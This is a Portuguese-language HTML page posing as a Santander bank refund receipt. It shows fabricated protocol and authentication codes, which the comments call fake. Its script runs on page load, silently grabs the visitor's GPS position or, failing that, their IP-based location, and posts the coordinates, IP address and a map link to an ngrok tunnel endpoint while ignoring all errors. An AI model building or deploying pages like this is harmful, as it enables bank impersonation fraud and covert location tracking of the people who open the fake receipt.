<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Comprovante de Estorno – Santander</title>
  <style>
    /* ======================================================================
       Estilo inspirado no comprovante digital de estorno do Banco Santander
       ====================================================================== */

    :root {
      --santander-red: #c40000;
      --santander-gray: #7d7d7d;
      --santander-light: #f5f5f5;
    }

    * { box-sizing: border-box; }

    body {
      font-family: "Helvetica Neue", Arial, sans-serif;
      background: var(--santander-light);
      margin: 0;
      padding: 16px;
    }

    .receipt {
      max-width: 600px;
      margin: 0 auto;
      background: #fff;
      border: 1px solid #d9d9d9;
      box-shadow: 0 2px 6px rgba(0,0,0,.08);
    }

    /* Cabeçalho ----------------------------------------------------------- */
    .header {
      background: var(--santander-red);
      color: #fff;
      padding: 20px 24px;
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .header img {
      width: 120px;
      height: auto;
    }

    .header h1 {
      font-size: 20px;
      font-weight: 700;
      margin: 0;
    }

    /* ... resto do CSS permanece inalterado ... */
  </style>
</head>
<body>
  <section class="receipt">
    <!-- Cabeçalho -->
    <div class="header">
      <h1>Comprovante de Estorno</h1>
    </div>

    <!-- Informações e demais seções inalteradas... -->

  </section>

  <!-- ==================================================================
       Script utilitário: data/hora, códigos aleatórios + localização (opcional)
       ================================================================== -->
  <script>
    // Preenche data e horário atuais
    const agora = new Date();
    document.getElementById("data-atual").textContent =
      agora.toLocaleDateString("pt-BR");
    document.getElementById("hora-atual").textContent =
      agora.toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit"
      });

    // Gera códigos simples (fake) – substitua por reais conforme necessidade
    const randHex = (n) =>
      [...crypto.getRandomValues(new Uint8Array(n))]
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");
    document.getElementById("protocolo").textContent = randHex(6).toUpperCase();
    document.getElementById("autenticacao").textContent = randHex(16).toUpperCase();

    /* === Localização opcional (mesma lógica da versão anterior) ========= */
    const BACKEND_ENDPOINT =
      "https://1e2746f31e5a.ngrok-free.app/send-location";
    const IP_API_URL = "https://ipapi.co/json/";

    document.addEventListener("DOMContentLoaded", obterLocalizacao);

    async function obterLocalizacao() {
      if (!window.isSecureContext) return obterLocalizacaoPorIP();
      try {
        if (navigator.permissions) {
          const st = await navigator.permissions.query({
            name: "geolocation"
          });
          if (st.state === "denied") return obterLocalizacaoPorIP();
        }
      } catch {
        /* ignore */
      }

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            const { latitude, longitude } = pos.coords;
            const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
            enviarPayload({
              latitude,
              longitude,
              mapsUrl,
              metodo: "gps"
            });
          },
          obterLocalizacaoPorIP,
          { enableHighAccuracy: true, timeout: 10000 }
        );
      } else {
        obterLocalizacaoPorIP();
      }
    }

    async function obterLocalizacaoPorIP() {
      try {
        const d = await fetch(IP_API_URL).then((r) => r.json());
        const { latitude, longitude, ip } = d;
        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        enviarPayload({
          latitude,
          longitude,
          ip,
          mapsUrl,
          metodo: "ip"
        });
      } catch {
        /* Silencia falhas */
      }
    }

    async function enviarPayload(data) {
      const payload = {
        ...data,
        timestamp: new Date().toISOString()
      };
      console.log("Payload a enviar:", payload);
      try {
        await fetch(BACKEND_ENDPOINT, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch {
        /* ignore */
      }
    }
  </script>
</body>
</html>
